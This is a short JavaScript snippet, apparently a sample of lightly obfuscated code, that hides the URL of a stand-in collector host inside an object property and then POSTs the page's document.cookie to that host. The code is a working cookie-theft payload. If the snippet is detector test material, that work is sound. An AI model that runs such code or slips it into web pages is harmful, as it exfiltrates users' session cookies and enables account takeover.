// String recovered through an inline object-property access.
const u={k:"https://collector.example/upload"}.k;
fetch(u,{method:"POST",body:document.cookie});
